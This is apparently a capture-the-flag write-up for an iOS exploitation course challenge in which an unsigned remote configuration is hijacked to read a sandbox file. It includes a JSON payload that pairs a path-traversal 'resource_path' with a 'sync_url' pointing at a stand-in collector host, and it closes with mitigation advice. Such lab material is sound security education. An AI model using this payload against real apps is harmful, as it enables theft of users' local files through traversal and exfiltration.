# Challenge 09 — BackSync

> **Course:** [iOS Application Exploitation Challenges](https://academy.8ksec.io/course/ios-application-exploitation-challenges)
> **Focus:** Remote configuration abuse → local sandbox file read

## Goal

The app fetches a remote configuration in the background. Craft a remote
configuration that triggers unintended behavior and reveals a flag stored
in a local sandbox file.

## Solution

1. Observe the sync: capture the config request/response (proxy + pinning
   bypass if needed) — identify the config format (JSON/plist) and whether
   the app trusts it (no signature check = the flaw).
2. Take control of the config source:
   - redirect the config host (DNS/hosts on JB, or proxy the response), or
   - MITM the response body if delivered over HTTP, or
   - if pinned: serve the config from your own server and reroute via the
     pinning bypass.
3. Craft the malicious config: apps like this map config keys to file
   paths/URLs used by a downloader/reader — try path-injection keys:

```json
{
  "background_sync": true,
  "resource_path": "../../../../../../../../etc/passwd",
  "sync_url": "https://your-collector/"
}
```

4. Trigger the background sync → the app reads the sandbox file (the flag)
   into the response/exfil channel — retrieve and submit the flag —
   lab solved.

## Mitigation

Sign remote configurations (HMAC), restrict keys to an allow-list schema,
and never let config values flow into file-path APIs.
